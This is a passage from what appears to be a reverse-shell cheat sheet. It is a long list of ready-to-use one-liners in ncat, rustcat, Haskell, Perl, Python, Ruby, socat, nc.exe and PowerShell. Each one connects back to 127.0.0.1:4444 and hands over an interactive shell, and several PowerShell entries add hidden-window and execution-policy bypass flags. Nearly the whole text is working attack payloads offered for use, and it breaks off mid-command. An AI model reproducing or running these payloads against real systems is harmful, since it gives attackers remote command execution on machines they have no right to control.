<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|cmd -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|powershell -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|pwsh -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>rustcat</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- rcat 127.0.0.1 4444 -r sh</span><br><span class="line">- rcat 127.0.0.1 4444 -r /bin/sh</span><br><span class="line">- rcat 127.0.0.1 4444 -r bash</span><br><span class="line">- rcat 127.0.0.1 4444 -r /bin/bash</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- rcat 127.0.0.1 4444 -r cmd</span><br><span class="line">- rcat 127.0.0.1 4444 -r powershell</span><br><span class="line">- rcat 127.0.0.1 4444 -r pwsh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Haskell #1</li>
</ul>
<p>	</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">module Main where</span><br><span class="line"></span><br><span class="line">import System.Process</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下面這一條有不同使用方式，根據自身環境選擇其中一條 `main=...` 使用</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">linux/mac</span></span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | bash -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">windows</span></span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | cmd -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | powershell -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | pwsh -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Perl</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;sh -i&quot;);&#125;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;bash -i&quot;);&#125;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;&#x27;</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;cmd -i&quot;);&#125;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;powershell -i&quot;);&#125;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;pwsh -i&quot;);&#125;;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Perl no sh</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;127.0.0.1:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;bash -i&quot;);&#125;;&#x27;</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;127.0.0.1:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Python</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">python2</span></span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;sh&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;bash&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;bash&quot;)&#x27;</span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">python3</span></span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;sh&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;bash&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">- python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span><br><span class="line">- python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">- python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;bash&quot;)&#x27;</span><br><span class="line">- python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">python2</span></span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;cmd&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;powershell&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;pwsh&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;cmd&quot;)&#x27;</span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;powershell&quot;)&#x27;</span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;pwsh&quot;)&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">python3</span></span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;cmd&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;powershell&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;pwsh&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">- python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;cmd&quot;)&#x27;</span><br><span class="line">- python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;powershell&quot;)&#x27;</span><br><span class="line">- python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;pwsh&quot;)&#x27;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Python3 shortest</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;sh&quot;)&#x27;</span></span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;bash&quot;)&#x27;</span></span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;cmd&quot;)&#x27;</span></span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;powershell&quot;)&#x27;</span></span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;pwsh&quot;)&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Ruby</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac/windows</span><br><span class="line">- ruby -rsocket -e<span class="string">&#x27;spawn(&quot;sh&quot;,[:in,:out,:err]=&gt;TCPSocket.new(&quot;127.0.0.1&quot;,4444))&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Ruby no sh</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac/windows</span><br><span class="line">- ruby -rsocket -e<span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;127.0.0.1&quot;,&quot;4444&quot;);loop&#123;c.gets.chomp!;(exit! if $_==&quot;exit&quot;);($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r)&#123;|io|c.print io.read&#125;))rescue c.puts &quot;failed: <span class="subst">#&#123;<span class="variable">$_</span>&#125;</span>&quot;&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>socat</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac/</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:sh</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:/bin/sh</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:bash</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:/bin/bash</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;sh&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;/bin/sh&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;bash&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;/bin/bash&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:cmd</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:powershell</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:pwsh</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;pwsh&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;cmd&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;powershell&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line"></span><br></pre></td></tr></table></figure>






<h3 id="For-Windows"><a href="#For-Windows" class="headerlink" title="For Windows"></a>For Windows</h3><ul>
<li><p>nc.exe -e</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e sh</span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e /bin/sh</span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e bash</span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e /bin/bash</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e <span class="built_in">cmd</span></span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e powershell</span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e pwsh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>ncat.exe -e</p>
</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e sh</span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e /bin/sh</span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e bash</span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e /bin/bash</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e <span class="built_in">cmd</span></span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e powershell</span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e pwsh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>PowerShell</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac/windows</span><br><span class="line">- powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.<span class="built_in">Net</span>.Sockets.TCPClient(&quot;<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&quot;,<span class="number">4444</span>);$stream = $client.GetStream();[byte[]]$bytes = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;while(($i = $stream.Read($bytes, <span class="number">0</span>, $bytes.Length)) -ne <span class="number">0</span>)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,<span class="number">0</span>, $i);$sendback = (iex $data <span class="number">2</span>&gt;&amp;<span class="number">1</span> | Out-String );$sendback2  = $sendback + &quot;PS &quot; + (pwd).<span class="built_in">Path</span> + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,<span class="number">0</span>,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br><span class="line">- powershell -nop -c &quot;$client = New-Object System.<span class="built_in">Net</span>.Sockets.TCPClient(&#x27;<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&#x27;,<span class="number">4444</span>);$stream = $client.GetStream();[byte[]]$bytes = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;while(($i = $stream.Read($bytes, <span class="number">0</span>, $bytes.Length)) -ne <span class="number">0</span>)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,<span class="number">0</span>, $i);$sendback = (iex $data <span class="number">2</span>&gt;&amp;<span class="number">1</span> | Out-String );$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).<span class="built_in">Path</span> + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,<span class="number">0</span>,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br><span class="line">- powershell -nop -W hidden -noni -ep bypass -c &quot;$TCPClient = New-Object <span class="built_in">Net</span>.Sockets.TCPClient(&#x27;<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&#x27;, <span class="number">4444</span>);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) &#123;[byte[]]$script:Buffer = <span class="number">0</span>..$TCPClient.ReceiveBufferSize | % &#123;<span class="number">0</span>&#125;;$StreamWriter.Write($String + &#x27;SHELL&gt; &#x27;);$StreamWriter.Flush()&#125;WriteToStream &#x27;&#x27;;while(($BytesRead = $NetworkStream.Read($Buffer, <span class="number">0</span>, $Buffer.Length)) -gt <span class="number">0</span>) &#123;$Command = ([text.encoding]::UTF8).GetString($Buffer, <span class="number">0</span>, $BytesRead - <span class="number">1</span>);$Output = try &#123;Invoke-Expression $Command <span class="number">2</span>&gt;&amp;<span class="number">1</span> | Out-String&#125; catch &#123;$_ | Out-String&#125;WriteToStream ($Output)&#125;$StreamWriter.Close()&quot;</span><br><span class="line">- powershell -nop -W hidden -noni -ep bypass -c &quot;$TCPClient = New-Object <span class="built_in">Net</span>.Sockets.TCPClient(&#x27;<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&#x27;, <span class="number">4444</span>);$NetworkStream = 